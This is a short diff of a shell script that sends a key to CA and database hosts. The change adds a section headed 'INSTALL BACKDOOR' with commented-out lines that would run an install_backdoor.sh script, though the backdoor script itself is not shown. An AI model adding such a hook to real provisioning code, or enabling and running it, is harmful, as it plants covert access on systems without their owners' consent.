@@ -166,7 +166,12 @@ send_key $CA_ADR $KEY
 send_key $DB_ADR $KEY
 
 
-# TODO: cleanup process
-##############
+
+######################
+## INSTALL BACKDOOR ##
+######################
+
+# echo "Installing backdoor scripts, make sure install_backdoor.sh file is available"
+# bash install_backdoor.sh
 
 
